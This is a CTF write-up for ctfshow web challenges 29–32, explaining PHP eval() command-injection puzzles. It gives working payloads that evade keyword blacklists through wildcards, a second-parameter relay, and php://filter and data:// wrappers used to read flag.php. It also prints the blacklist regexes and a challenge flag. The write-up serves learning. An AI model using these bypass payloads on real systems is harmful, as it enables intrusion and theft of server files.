---
title: ctfshow-web-命令执行
description: web-wp
recommend: 5
permalink: /2026/ctfshow-web-command-exec
date: 2026-11-01 10:15:00
updated: 2026-11-01 10:16:00
image:  /images/baopo/2.jpg
categories: [web]
tags: [web,命令执行]
---

---

## web29

### 读懂代码

```php
error_reporting(0);/*关闭报错，即使错了也不会显示的，防止我们靠报错信息探测*/
if(isset($_GET['c'])){/*检查url里头，有没有报错的参数C*/
    $c = $_GET['c'];/*把参数C赋值给变量$C*/
    if(!preg_match("/flag/i", $c)){/*用正则看有没有flag这四个字母*/
        eval($c);/*没有的话就把$C当作代码执行*/
    }
    
}else{
    highlight_file(__FILE__);/*没传参数c时就把,题目源码高亮显示出来给我们看*/
}
```

### 函数

| 函数       | 作用                                                         |
| ---------- | ------------------------------------------------------------ |
| preg_match | php的正则匹配函数，“/flag/i”表示寻找字符串“flag”,"i"表示不区分大小写，也就是说，flag,Flag,FLAG都算 |
| eval()     | 把字符串当代码执行的函数，危险函数之一，它执行的是php代码，而不是终端命令 |
### 思路（开始之前先弄清楚这些）

#### Q1:我们的目标是什么？

拿flag，flag肯定藏在某个文件里（ctf-web一贯这样），那会是哪个文件呢？大概叫flag.php,我为什么会猜这个？首先，flag.php在我信息搜集的文章中遇到过，算是常见的可能会藏有flag的文件名之一，其次，你看代码` if(!preg_match("/flag/i", $c))`用正则检验有没有flag这个字符串，必须要没有flag这个字符串才能走下一步，你猜它为什么不禁别的字符串，唯独禁flag？偏爱吗❤?那很爱了。

当然是因为，文件名包含这个字符串啊，只是我们没办法明着访问flag.php

#### Q2:有什么可以利用的？

eval()会执行我传入的任何不含flag的php代码，这正是可以利用的一点

#### Q3:障碍是什么？怎么绕？

障碍：我的http请求里不能出现flag这四个连续的字母，包括大写，但是难点就在于目标文件偏偏又叫flag.php,所以我们需要绕过，有两种绕过思路

- 1.命令里不写”flag“,但照样能读到它→通配符，字符串拼接，编码
- 2.”写flag“但不写在被检查的参数C里：题目只检查$_GET['C'],我们传另一个参数装payload,C里头只写一句中转代码

### 法一：通配符绕过（经典）

### 什么是通配符？

`*` 是 **Linux Shell 的通配符**（glob），它由 Shell 在执行前展开：`f*` 自动匹配当前目录下所有 `f` 开头的文件名，`flag.php` 正好命中。

```
?c=system('ls');
?c=system('cat f*')
```

**过滤发生在 PHP 层，通配展开发生在 Shell 层，过滤者根本看不到展开后的真名。**

直接在url里边访问

```
https://f85fae9f-....challenge.ctf.show/?c=system('ls');
```

![image-20261101112601374](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101112601374.png)

先确认flag.php确实存在，再进行下一步

**这里特别要注意单引号要是直的，英文格式下的，不然界面可能会是空白，还有一点，最后的分号不能少**

如果写`?c=system('cat f*')`,界面可能是空白，需要ctrl+u查看源码才能看到flag

![image-20261101114359463](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101114359463.png)

如果写`?c=system('tac f*')`,可以直接看到flag

![image-20261101114549378](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101114549378.png)

#### Q:为什么cat tac 正着写和倒着写，显示的界面不一样？

 cat tac 两份输出的开头内容不一样，导致html解析器之后处理方式也不一样

浏览器渲染时，会扫描响应内容，遇到<就会进入“标签解析模式”：遇到`<?`开头，浏览器会把它当作一条注释开头，一直吞到下一个>为止，所以说，从`<?`到`>`的内容都不会在界面上显示，所以需要`ctrl+u`查看，刚巧,php的开始结尾就是`<?php ...?>`，看上边红字黑底的图片可知，这个文件没有？>,所以就一直从<?php吞到文件末尾,flag就显示不出来了

```php
<?php  /*从这里开始吞*/

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-04 00:14:07
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-04 00:14:17
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

$flag = 'ctfshow{33a9d6bd-fee1-40ee-9cc1-88067edd1015}'; /*由于没有结束标志`>`就一直吞到文件末尾，包括flag,所以flag无法显示*/
```



tac倒着输出就刚好是红字黑底那张图片中的代码倒过来

#### tac很巧妙

```php
$flag = 'ctfshow{33a9d6bd-fee1-40ee-9cc1-88067edd1015}';
*/
# @link: https://ctfer.com
# @email: h1xa@ctfer.com
...
# -*- coding: utf-8 -*-
/*
<?php /*从这里开始吞，完全不影响flag输出*/
```

### 法二：双参数中转

#### 为什么可以绕过？

 ` if(!preg_match("/flag/i", $c))`正则只检查$c这一个参数的值，其它参数没有被检查，那就可以传两个参数，第一个参数绕过检查（参数的值是第二个参数的名字，不含flag），检查只会检查到一个参数名，第二个参数放真正的flag文件名，并且用函数获取文件内容。

```
?c=system($_GET[1]);&1=tac flag.php
```

`?c=system($_GET[1]);`里边没有flag这个字符串，通过，执行eval

`&1=tac flag.php`里边写着flag但是，没人检查啊

![image-20261101122326876](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101122326876.png)

```
?c=eval($_GET[1]);&1=system('tac flag.php');
```

这么写也可以

### 法三：include + php://filter 伪协议（经典）

这题的内容在php伪协议和base64过滤中详细解释了，信息搜集篇也有对include的解释，这里已经是第三次遇到了，具体内容就不做解释了

之前我们都是include作为题目内容，我们使用php伪协议，这里我们将include和php结合起来

```
?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

得到的是base64编码的flag，找一些解码工具解码就行

![image-20261101123443608](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101123443608.png)

### 法四：把flag藏进编码里

既然题目不给出现flag这个字符串，那我把它编码了，不明着出现不就好了，但是它还是flag这个意思

我把tac flag.php编码之后填入system中

![image-20261101124518736](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101124518736.png)

![image-20261101124900727](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261101124900727.png)

---

## web30

代码里和上一题相同的部分我就不注释了

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){/*一样的正则匹配，这里要绕过的是flag,system,php等三个字符串*/
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

### 读懂代码

```php
 if(!preg_match("/flag|system|php/i", $c))
```

这一句，依旧用到了preg_match()函数，正则匹配函数，"/.../"是正则的分隔符，“|”表示或，"i"表示不区分大小写，说明，我们在url中输入指令时，不能输入含flag,Flag，system,System,php,PHP等字符串，也就是说，我们没办法像上一题一样用``system()`,也不能写，`flag.php`,我们需要绕过这三个字符串

#### 先扫描一下根目录，看看有什么

```
...?c=print_r(scandir('/'));
```

- print_r():print readable,把变量内容以人能读懂的形式打印出来
- scandir():scan directory扫描一个目录里所有的文件，返回**数组**

#### 为什么要扫描根目录？

因为根目录是我们唯一知道的，确定的目录，也存在装有flag的文件放在根目录下的情况，这里啥也没扫出来

![image-20261102143408646](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102143408646.png)

### 扫描当前目录

```
?c=print_r(scandir(getcwd()));
```

这一句代码按顺序从上到下执行是这样的：

| 函数                    | 作用                               | 输入（）里边填什么 | 输出（返回什么） |
| ----------------------- | ---------------------------------- | ------------------ | ---------------- |
| getcwd                  | 取当前工作目录                     | -                  | 返回一个字符串   |
| scandir：scan directory | 扫描一个目录里所有的文件           | 目录               | 返回**数组**     |
| print_r：print readable | 把变量内容以人能读懂的形式打印出来 | -                  | -                |



![image-20261102143253532](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102143253532.png)

看到了flag.php,说明flag大概率就在这个文件夹里，但是题目过滤掉了flag,system,php，所以我们要绕过它们

### 怎么绕过呢？

关注一下，`?c=print_r(scandir(getcwd()));`返回的内容有哪些文件，flag.php index.php 我们是不是可以利用上一道题学到的通配符这种办法绕过呢

```
...?c=highlight_file(glob("f*")[0]);//在glob返回的数组中取flag.php，用highlight_file输出flag.php源码
```

| 函数           | 作用               | 输入                                                         | 输出         |
| -------------- | :----------------- | ------------------------------------------------------------ | ------------ |
| highlight_file | 读取并显示文件内容 | 输入需要字符串，刚好glob("f*")[0]返回的就是”flag.php“这串字符串 | 输出文件源码 |
#### 为什么要有[0]呢？

因为，glob按通配符查找文件/目录的函数，**返回数组**。因为"f*"通配符匹配的是f开头的所有文件，而当前目录下，f开头的有且仅有flag.php这是在扫描当前目录之后我们得知的，[0]表示取的是第一个文件，那不就是唯一的flag.php嘛

![image-20261102151933466](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102151933466.png)

---

## web31

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

### 禁了哪些东西

`flag | system | php | cat | sort | shell | . | 空格 | 单引`

依旧可以沿用上题的解题办法

```
...?c=print_r(scandir('/'));
```

```
?c=print_r(scandir(getcwd()));
```

```
...?c=highlight_file(glob("f*")[0]);//在glob返回的数组中取flag.php，用highlight_file输出flag.php源码
```

### 如果第二步扫描目录，不只一个f开头的文件怎么办？

- 法一：先看具体有哪些文件

  ``` 
  ?c=print_r(glob("f*"));
  ```

  假设是：

  ```
  Array
  (
      [0] => fa.php
      [1] => flag.php//flag在[1]
      [2] => foo.php
  )
  ```

  那就把`...?c=highlight_file(glob("f*")[0]);`中的[0]改成[1]

- 法二：缩小匹配模式

  把glob（“f*）换成

  ```
  glob("fla*")
  glob("f?ag*")
  glob("f[l]ag*")
  ```

---

## web32

```php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这题禁的东西可就多了，我们来看，首先要明确`/.../`是分隔符，`/.../i`后边加一个i表示不区分大小写，由此可知，`/.../i`里边的东西就是黑名单

### 怎么看黑名单？

`flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(` 

|:表示或，\ :是转义符，正则匹配里有些字符本身就有特殊含义，所以在匹配它们时需要加转义符，而我们在阅读时可以把转义符去掉，这样来看会更加清晰一点

| 被禁     | 影响                                     |
| :------- | :--------------------------------------- |
| `flag`   | 不能写 `flag.php`、`/flag`、`$flag`      |
| `system` | 不能用 `system()`                        |
| `php`    | 不能写 `phpinfo()`、`php://`、`flag.php` |
| `cat`    | 不能用 `cat` 命令                        |
| `sort`   | 不能用 `sort` 命令                       |
| `shell`  | 不能用 `shell_exec()`                    |
| `.`      | 不能写扩展名、路径中的点                 |
| 空格     | 不能用普通空格分隔代码或命令             |
| `'`      | 不能用单引号字符串                       |
| 反引号 ` | 不能用反引号执行命令                     |
| `echo`   | 不能用 `echo` 输出                       |
| `;`      | 不能用分号结束语句                       |
| `(`      | 不能写左括号，**也就是不能正常调用函数** |

###  这题的黑名单那么多，连函数都禁了怎么办？

#### include可以解决（被禁的问题

**include不是函数，它是php语言结构的关键字，它的语法是`include 表达式;`**

但是我们平时写题时见多了`include()`带括号的形式，容易先入为主，以为它是函数，其实不是

#### 双参数

记得之前也提过这个思路，代码中被检查的只有变量C,这时候就可以用双变量，绕过对C的黑名单检查

用双参数绕过的办法查看当前目录下有什么文件

```
?c=include$_GET[1]?>&1=data://text/plain,<?php print_r(scandir(getcwd()));?>
```

![image-20261102203954763](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102203954763.png)

然后发现有flag.php,大概率就是在这里，那问题就回到怎么取flag,php文件里的内容了

#### 为什么include$_GET没有空格也可以？_

按理来说include的表达式是`include 表达式;`因为，php虽然大多数是用空格来分词的，但其实它是靠词法（token）来分词的,这里`$` 不能接在标识符后面，是一个明确的分界，所以不用空格。

疑？？？？这个味道有没有感觉很熟悉？
include+想要输出文件里的内容 应该怎么写来着

**include+php伪协议+base64过滤**

为什么这么搭配来着，简而言之就是，include它不能碰上php语言的<?php开头,不然就不会把文本内容打印出来，我们就看不到，所以这里需要伪协议破坏掉，就利用base64编码，破环掉开头，让include打出文件内容

具体写法

```
php://filter/read=convert.base64-encode/resource=flag.php
```

![image-20261102205605635](https://zelia-avatar-1471520438.cos.ap-guangzhou.myqcloud.com/blog/images/image-20261102205605635.png)

得到之后解码即可